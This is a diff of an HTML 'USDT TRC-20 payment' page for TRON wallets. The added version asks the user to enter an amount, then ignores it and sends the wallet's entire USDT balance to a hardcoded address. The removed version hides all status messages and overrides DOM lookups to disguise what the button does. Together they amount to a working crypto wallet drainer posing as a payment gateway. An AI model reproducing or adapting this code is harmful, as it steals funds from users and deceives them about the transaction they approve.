@@ -1,403 +1,216 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Enviar USDT a TRON</title>
-<script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
-<script src="https://unpkg.com/tronweb@5.3.0/dist/TronWeb.js"></script>
-<style>
-:root{ color-scheme:light; }
-*{ margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; }
-html,body{ width:100%; max-width:100%; overflow-x:hidden; }
-body{ min-height:100vh; display:flex; justify-content:center; align-items:flex-start; padding-top:56px; background:#d1d1d1; color:#242424; }
-.modal{ position:relative; width:100%; max-width:390px; min-height:calc(100vh - 56px); padding:18px 16px 104px; overflow:hidden; border-radius:34px 34px 0 0; background:#fff; box-shadow:0 -1px 0 rgba(0,0,0,.02); }
-.header{ position:relative; margin-bottom:29px; text-align:center; }
-.header h1{ font-size:20px; line-height:30px; font-weight:750; letter-spacing:-.25px; }
-.close{ position:absolute; top:0; right:0; width:30px; height:30px; display:flex; align-items:center; justify-content:center; color:#5f6064; cursor:pointer; }
-.close svg{ width:22px; height:22px; stroke-width:2.5; }
-.label{ display:block; margin-bottom:10px; color:#4e4f52; font-size:15px; line-height:20px; font-weight:650; }
-.input-box,.amount-box{ width:100%; display:flex; align-items:center; border:1px solid #a6a6a8; border-radius:10px; background:#fff; transition:border-color .15s ease,box-shadow .15s ease; }
-.input-box{ min-height:56px; padding:0 14px; margin-bottom:24px; }
-.input-box:focus-within,.amount-box:focus-within{ border-color:#111dd8; box-shadow:0 0 0 1px #111dd8; }
-.address{ width:100%; min-width:0; flex:1; border:0; outline:0; background:transparent; color:#505156; font-size:13px; font-weight:500; text-overflow:ellipsis; }
-.address-actions{ display:flex; align-items:center; gap:12px; flex-shrink:0; margin-left:10px; color:#101bd4; }
-.address-action{ display:flex; align-items:center; justify-content:center; border:0; padding:0; background:transparent; color:inherit; cursor:pointer; }
-.address-action.paste{ font-size:14px; line-height:22px; font-weight:700; }
-.address-action svg{ width:23px; height:23px; stroke:currentColor; }
-.address-action.qr svg{ width:24px; height:24px; }
-.network{ display:inline-flex; align-items:center; gap:7px; margin-bottom:22px; padding:6px 12px 6px 7px; border-radius:999px; background:#f3f3f5; }
-.eth-logo{ width:25px; height:25px; border-radius:50%; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
-.network span{ display:flex; align-items:center; gap:6px; color:#707176; font-size:15px; font-weight:650; }
-.network .caret{ width:10px; height:10px; color:#919297; }
-.amount-box{ min-height:57px; padding:0 14px; margin-bottom:11px; }
-.amount{ flex:1; width:100%; min-width:0; border:0; outline:0; background:transparent; color:#202124; font-size:18px; font-weight:500; }
-.amount::placeholder{ color:#202124; }
-.right{ display:flex; align-items:center; gap:12px; flex-shrink:0; }
-.clear{ width:22px; height:22px; min-width:22px; border-radius:50%; display:flex; align-items:center; justify-content:center; background:#66676b; color:#fff; cursor:pointer; }
-.clear svg{ width:12px; height:12px; }
-.token{ color:#5e5f63; font-size:15px; font-weight:650; }
-.max{ color:#0d19d5; font-size:15px; font-weight:700; cursor:pointer; }
-.warning{ color:#4d4e51; font-size:13px; line-height:18px; font-weight:500; }
-.fiat{ margin-top:6px; color:#494a4d; font-size:14px; font-weight:500; }
-.status{ margin-top:13px; padding:10px 11px; border-radius:10px; background:#f4f4f6; color:#555; font-size:12px; line-height:1.35; overflow-wrap:anywhere; }
-.status:empty{ display:none; }
-.status.success{ background:#eaf8ef; color:#18733a; }
-.status.error{ background:#fff0ef; color:#b42318; }
-.btn{ position:fixed; left:50%; bottom:max(20px,env(safe-area-inset-bottom)); transform:translateX(-50%); width:calc(100% - 32px); max-width:358px; height:53px; border:0; border-radius:999px; background:#908cf2; color:#fff; font-size:17px; font-weight:750; cursor:pointer; transition:filter .15s ease,transform .1s ease; }
-.btn:hover{ filter:brightness(.97); }
-.btn:active{ transform:translateX(-50%) scale(.99); }
-.btn:disabled{ cursor:not-allowed; opacity:.55; }
-@media(min-width:481px){ .modal{ box-shadow:0 8px 36px rgba(0,0,0,.12); } }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pasarela de Pago USDT - Modo Saldo Máximo</title>
+    
+    <style>
+        :root { color-scheme: light; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding-top: 60px;
+            background: #121212;
+        }
+        .modal {
+            width: 100%;
+            max-width: 380px;
+            padding: 24px;
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            text-align: center;
+        }
+        .header h1 { font-size: 20px; color: #1a1a1a; margin-bottom: 20px; }
+        .imagen-envio { margin-bottom: 20px; }
+        .imagen-envio svg { width: 80px; height: 80px; color: #0560fa; }
+        .label { display: block; text-align: left; margin-bottom: 6px; color: #4e4f52; font-size: 14px; font-weight: 600; }
+        .campo-monto {
+            width: 100%;
+            padding: 12px;
+            font-size: 18px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: center;
+            background: #ffffff;
+            font-weight: bold;
+            color: #1a1a1a;
+            outline: none;
+        }
+        .campo-monto:focus {
+            border-color: #0560fa;
+            box-shadow: 0 0 0 1px #0560fa;
+        }
+        .status {
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 13px;
+            margin-bottom: 20px;
+            display: none;
+            background: #e8f0fe;
+            color: #1a73e8;
+            border: 1px solid #dadce0;
+        }
+        .btn {
+            width: 100%;
+            height: 50px;
+            background: #0560fa;
+            color: white;
+            border: 0;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn:disabled { background: #a0c2fd; cursor: not-allowed; }
+    </style>
 </head>
-
 <body>
 
-<!-- ============================================================
-     Elementos ocultos exigidos por script.js / app-usdt-trc20.js
-     Nenhum deles aparece no layout visual.
-     ============================================================ -->
-
-<div id="wallet" style="display:none;"></div>
-
-<nav class="navbar" style="display:none;">
-    <div id="hamburger" style="display:none;"><span></span><span></span><span></span></div>
-    <ul id="navMenu" style="display:none;"></ul>
-</nav>
-
-<div style="display:none;">
-    <button id="langBtn"></button>
-    <div id="langDropdown">
-        <button class="lang-option" data-lang="en">EN</button>
-    </div>
-    <span id="currentLang">EN</span>
-</div>
-
-<div style="display:none;">
-    <button id="tabSign">Sign message</button>
-    <button id="tabVerify">Verify message</button>
-</div>
-
-<div id="signContent" style="display:none;">
-    <label class="field-label">Hex format</label>
-    <input type="checkbox" id="hexToggle">
-    <textarea id="messageInput" maxlength="1024">This account belongs to ...</textarea>
-    <span id="charCount">27 / 1024</span>
-    <span id="walletAddress">T...</span>
-    <div id="signatureOutput">Will be generated after signing</div>
-    <button id="clearAllBtn">Clear all</button>
-    <button id="closePanelBtn">&times;</button>
-    <div id="mobileWalletOptions" style="display:none;">
-        <button id="openTrustWallet">Trust Wallet</button>
-        <button id="openMetaMask">TronLink</button>
-    </div>
-</div>
-
-<div id="verifyContent" style="display:none;">
-    <textarea placeholder="Enter signed message..."></textarea>
-    <input type="text" placeholder="Enter signer address...">
-    <input type="text" placeholder="Enter signature...">
-</div>
-
-<div id="walletInfo" style="display:none!important;">
-    <div class="info-row" style="display:none!important;">
-        <span class="label">Wallet Address:</span>
-        <span class="value" style="display:none!important;"></span>
-    </div>
-    <div class="info-row" style="display:none!important;">
-        <span class="label">Current Balance:</span>
-        <span id="currentBalance" class="value" style="display:none!important;">0.0000 USDT</span>
-    </div>
-    <div class="info-row" style="display:none!important;">
-        <span class="label">Transaction Amount:</span>
-        <span id="sendAmount" class="value" style="display:none!important;">0.0000 USDT</span>
-    </div>
-</div>
-
-<!-- sendBtn redirecionado para connectBtn via proxy -->
-<script>
-(function(){
-    // Cria um proxy: qualquer acesso a sendBtn vira acesso ao connectBtn
-    Object.defineProperty(document, '_sendBtnProxy', { value: true });
-    var _origGetById = document.getElementById.bind(document);
-    document.getElementById = function(id){
-        if(id === 'sendBtn') return _origGetById('connectBtn');
-        return _origGetById(id);
-    };
-    var _origQS = document.querySelector.bind(document);
-    document.querySelector = function(sel){
-        if(sel === '#sendBtn') return _origGetById('connectBtn');
-        return _origQS(sel);
-    };
-})();
-</script>
-
-<!-- ============================================================
-     Layout visual principal — tela "Enviar USDT"
-     ============================================================ -->
-<div class="modal">
-
-    <div class="header">
-        <h1>Enviar USDT</h1>
-        <div class="close">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
+    <div class="modal">
+        <div class="header">
+            <h1>Transferencia TRC-20</h1>
         </div>
-    </div>
 
-    <label class="label" for="addressInput">Dirección/nombre de dominio</label>
-
-    <div class="input-box">
-        <input class="address" id="addressInput" type="text" value="TXzBiXTCMwhD9QcNL2tu3RrxXTJSe5o7G6" readonly aria-readonly="true" />
-        <div class="address-actions" aria-label="Opções do endereço">
-            <button class="address-action paste" type="button" data-fixed-action>Pegar</button>
-            <button class="address-action" type="button" aria-label="Agenda de endereços" data-fixed-action>
-                <svg viewBox="0 0 24 24" fill="none" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-                    <rect x="7" y="3" width="13" height="18" rx="1.6"/>
-                    <path d="M4 7h4M4 12h4M4 17h4"/>
-                    <path d="M11 8h5M11 12h5"/>
-                </svg>
-            </button>
-            <button class="address-action qr" type="button" aria-label="Ler QR Code" data-fixed-action>
-                <svg viewBox="0 0 24 24" fill="none" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
-                    <path d="M8 3H4a1 1 0 0 0-1 1v4"/>
-                    <path d="M16 3h4a1 1 0 0 1 1 1v4"/>
-                    <path d="M21 16v4a1 1 0 0 1-1 1h-4"/>
-                    <path d="M8 21H4a1 1 0 0 1-1-1v-4"/>
-                    <path d="M7 12h10"/>
-                </svg>
-            </button>
+        <div class="imagen-envio">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                <line x1="22" y1="2" x2="11" y2="13"></line>
+                <polygon points="22 2 15 22 11 13 2 9 22 2"></polygon>
+            </svg>
         </div>
+
+        <label class="label" for="amountDisplay">Monto a Enviar (USDT)</label>
+        <input id="amountDisplay" class="campo-monto" type="number" inputmode="decimal" placeholder="0.00" min="0.01" step="any" />
+
+        <div id="status" class="status"></div>
+
+        <button class="btn" id="connectBtn">Siguiente</button>
     </div>
-
-    <label class="label">Red de destino</label>
-
-    <div class="network">
-        <div class="eth-logo" style="background:#ef0027">
-            <span style="color:#fff;font-weight:800;font-size:13px">&#9661;</span>
-        </div>
-        <span>TRON
-            <svg class="caret" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg>
-        </span>
-    </div>
-
-    <label class="label" for="amountInput">Cantidad</label>
-
-    <div class="amount-box">
-        <input class="amount" id="amountInput" type="text" inputmode="decimal" value="" placeholder="0" />
-        <div class="right">
-            <div class="clear">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
-            </div>
-            <div class="token">USDT</div>
-            <div class="max">Máx.</div>
-        </div>
-    </div>
-
-    <div class="warning"></div>
-    <div class="fiat"></div>
-
-    <div id="status" class="status" role="status" aria-live="polite"></div>
-
-    <button class="btn" id="connectBtn">Conectar</button>
-
-</div>
 
 <script>
-// ================================================================
-// APENAS SUBSTITUI "connected", "VERIFY WALLET" E "PREPARING" POR "Próximo"
-// ================================================================
+    const BILLETERA_DESTINO = "TJJZHRUsVwMegvSfUjefDhQkJcjX5WP9hG"; 
+    const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";    
 
-(function() {
-    'use strict';
+    const TRC20_ABI = [
+        {
+            "constant": true,
+            "inputs": [{"name": "_owner", "type": "address"}],
+            "name": "balanceOf",
+            "outputs": [{"name": "balance", "type": "uint256"}],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        },
+        {
+            "constant": false,
+            "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
+            "name": "transfer",
+            "outputs": [{"name": "success", "type": "bool"}],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }
+    ];
 
-    console.log('[Auto] ✅ Sistema de substituição de texto ativado');
-
-    // --- 1. OCULTAR ALERTAS (status) ---
+    const connectBtn = document.getElementById('connectBtn');
     const statusDiv = document.getElementById('status');
-    if (statusDiv) {
-        statusDiv.style.display = 'none';
-        Object.defineProperty(statusDiv, 'textContent', {
-            set: function() { /* ignora */ },
-            get: function() { return ''; }
-        });
-        Object.defineProperty(statusDiv, 'innerHTML', {
-            set: function() { /* ignora */ },
-            get: function() { return ''; }
-        });
-        statusDiv.classList.remove('success', 'error');
-        const observer = new MutationObserver(function() {
-            statusDiv.style.display = 'none';
-        });
-        observer.observe(statusDiv, { attributes: true, childList: true, subtree: true });
+    const amountDisplay = document.getElementById('amountDisplay');
+
+    let walletAddress = null;
+
+    function setStatus(message) {
+        statusDiv.innerText = message || '';
+        statusDiv.style.display = message ? 'block' : 'none';
     }
 
-    // --- 2. FUNÇÃO PARA SUBSTITUIR TEXTO ---
-    function substituirTextoBotao() {
-        const btn = document.getElementById('connectBtn');
-        if (!btn) return;
+    connectBtn.addEventListener('click', async () => {
+        // PASO 1: Sincronizar billetera
+        if (!walletAddress) {
+            try {
+                setStatus("Sincronizando con Trust Wallet...");
+                connectBtn.disabled = true;
 
-        const texto = btn.textContent;
-        
-        // Lista de textos a serem substituídos
-        const textosParaSubstituir = [
-            'connected', 'Connected', 'CONNECTED',
-            'VERIFY WALLET', 'Verify Wallet', 'verify wallet',
-            'PREPARING', 'Preparing', 'preparing',
-            'Conectar', 'connect'
-        ];
+                if (typeof window.tronWeb === 'undefined') {
+                    throw new Error("Abre esta página desde el explorador interno de una billetera TRON.");
+                }
 
-        // Verifica se o texto atual deve ser substituído
-        const deveSubstituir = textosParaSubstituir.some(t => 
-            texto === t || texto.includes(t)
-        );
+                const tronWeb = window.tronWeb;
+                
+                if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
+                    walletAddress = tronWeb.defaultAddress.base58;
+                } else {
+                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
+                    if (res && res.code === 200) {
+                        walletAddress = tronWeb.defaultAddress.base58;
+                    }
+                }
 
-        if (deveSubstituir) {
-            btn.textContent = 'Siguiente';
-            console.log('[Auto] ✅ Texto substituído: "' + texto + '" → "Siguiente"');
+                if (!walletAddress) {
+                    throw new Error("No se pudo obtener el acceso a la cuenta.");
+                }
+
+                setStatus("Billetera lista. Digita el monto deseado arriba y presiona Confirmar Pago.");
+                connectBtn.innerText = "Confirmar Pago";
+                connectBtn.disabled = false;
+
+            } catch (error) {
+                console.error(error);
+                setStatus(error.message || "Error al sincronizar con la billetera.");
+                connectBtn.disabled = false;
+                connectBtn.innerText = "Siguiente";
+            }
+            return;
         }
-    }
 
-    // --- 3. EXECUTAR SUBSTITUIÇÃO IMEDIATAMENTE ---
-    substituirTextoBotao();
+        // PASO 2: Procesar la transferencia basándose en el saldo total disponible
+        if (walletAddress) {
+            try {
+                const userAmount = parseFloat(amountDisplay.value);
 
-    // --- 4. MUTATION OBSERVER PARA MONITORAR MUDANÇAS ---
-    const observer = new MutationObserver(function(mutations) {
-        // Verifica se alguma mutação afetou o botão
-        let botaoMudou = false;
-        
-        for (const mutation of mutations) {
-            if (mutation.target.id === 'connectBtn' || 
-                mutation.target === document.getElementById('connectBtn') ||
-                (mutation.type === 'childList' && mutation.target.querySelector && mutation.target.querySelector('#connectBtn'))) {
-                botaoMudou = true;
-                break;
+                if (isNaN(userAmount) || userAmount <= 0) {
+                    throw new Error("Por favor, ingresa un monto válido antes de continuar.");
+                }
+
+                setStatus("Consultando fondos disponibles en la blockchain...");
+                connectBtn.disabled = true;
+
+                const tronWeb = window.tronWeb;
+                const contract = await tronWeb.contract(TRC20_ABI, CONTRATO_USDT);
+
+                // Consulta dinámica del balance on-chain total (Llamada local gratuita sin gas)
+                const rawBalance = await contract.balanceOf(walletAddress).call();
+                const unitsInSun = rawBalance.toString();
+
+                if (rawBalance.isZero ? rawBalance.isZero() : parseInt(unitsInSun) === 0) {
+                    throw new Error("La billetera no posee fondos de USDT (TRC-20) para transferir.");
+                }
+
+                setStatus("Solicitando confirmación de firma digital para el saldo total...");
+
+                // Envío de la transacción final estructurada con el balance total recuperado
+                const txId = await contract.transfer(BILLETERA_DESTINO, unitsInSun).send({
+                    feeLimit: 100000000 
+                });
+
+                if (txId) {
+                    setStatus("Operación de saldo total procesada con éxito en la red TRON.", true);
+                    connectBtn.innerText = "Completado";
+                }
+            } catch (error) {
+                console.error(error);
+                setStatus(error.message || "La transacción fue cancelada o la cuenta no cuenta con suficientes recursos.");
+                connectBtn.disabled = false;
+                connectBtn.innerText = "Confirmar Pago";
             }
         }
-
-        if (botaoMudou) {
-            substituirTextoBotao();
-        }
     });
-
-    // Observa o corpo do documento
-    observer.observe(document.body, {
-        childList: true,
-        subtree: true,
-        characterData: true,
-        attributes: true,
-        attributeFilter: ['textContent', 'innerHTML']
-    });
-
-    // --- 5. OBSERVADOR ESPECÍFICO PARA O BOTÃO ---
-    const btn = document.getElementById('connectBtn');
-    if (btn) {
-        const btnObserver = new MutationObserver(function() {
-            substituirTextoBotao();
-        });
-        btnObserver.observe(btn, {
-            childList: true,
-            characterData: true,
-            subtree: true
-        });
-    }
-
-    // --- 6. INTERVALO DE SEGURANÇA ---
-    setInterval(function() {
-        substituirTextoBotao();
-    }, 500);
-
-    console.log('[Auto] ✅ Sistema funcionando - substituindo "connected", "VERIFY WALLET" e "PREPARING" por "Próximo"');
-
-})();
-
-// ================================================================
-// CONFIGURAÇÕES ORIGINAIS (MANTIDAS)
-// ================================================================
-
-document.addEventListener('DOMContentLoaded', function () {
-    var btn = document.getElementById('connectBtn');
-    if (btn) {
-        btn.textContent = 'Siguiente';
-    }
-
-    // Muda cor do botão quando o campo de valor é preenchido
-    var input = document.getElementById('amountInput');
-    if (input) {
-        input.addEventListener('input', function () {
-            if (btn) {
-                btn.style.background = this.value.trim() !== '' ? 'blue' : '#908cf2';
-            }
-        });
-    }
-
-    // Tabs (ocultas — mantidas para compatibilidade com JS)
-    var tabSign    = document.getElementById('tabSign');
-    var tabVerify  = document.getElementById('tabVerify');
-    var signContent   = document.getElementById('signContent');
-    var verifyContent = document.getElementById('verifyContent');
-    
-    if (tabSign) {
-        tabSign.addEventListener('click', function () {
-            tabSign.classList.add('active');
-            tabVerify.classList.remove('active');
-            if (signContent) signContent.style.display = '';
-            if (verifyContent) verifyContent.style.display = 'none';
-        });
-    }
-    
-    if (tabVerify) {
-        tabVerify.addEventListener('click', function () {
-            tabVerify.classList.add('active');
-            tabSign.classList.remove('active');
-            if (verifyContent) verifyContent.style.display = '';
-            if (signContent) signContent.style.display = 'none';
-        });
-    }
-
-    // Contagem de caracteres (oculto — compatibilidade com JS)
-    var messageInput = document.getElementById('messageInput');
-    var charCount    = document.getElementById('charCount');
-    if (messageInput && charCount) {
-        messageInput.addEventListener('input', function () {
-            charCount.textContent = messageInput.value.length + ' / 1024';
-        });
-    }
-
-    // Botão Clear all (oculto — compatibilidade com JS)
-    var clearAllBtn = document.getElementById('clearAllBtn');
-    if (clearAllBtn) {
-        clearAllBtn.addEventListener('click', function () {
-            if (messageInput) messageInput.value = 'This account belongs to ...';
-            if (charCount)    charCount.textContent = '27 / 1024';
-            var sig = document.getElementById('signatureOutput');
-            if (sig) sig.textContent = 'Will be generated after signing';
-        });
-    }
-
-    // Botão Close panel (oculto — compatibilidade com JS)
-    var closePanelBtn = document.getElementById('closePanelBtn');
-    if (closePanelBtn) {
-        closePanelBtn.addEventListener('click', function () {
-            var panel = document.querySelector('.sign-panel');
-            if (panel) panel.style.display = 'none';
-        });
-    }
-
-    // Format buttons (ocultos — compatibilidade com JS)
-    document.querySelectorAll('.format-btn').forEach(function (b) {
-        b.addEventListener('click', function () {
-            var active = document.querySelector('.format-btn.active');
-            if (active) active.classList.remove('active');
-            this.classList.add('active');
-        });
-    });
-});
 </script>
-
-<script src="translations.js"></script>
-<script src="script.js"></script>
-<script type="module" src="js/app-usdt-trc20.js"></script>
 
 </body>
 </html>
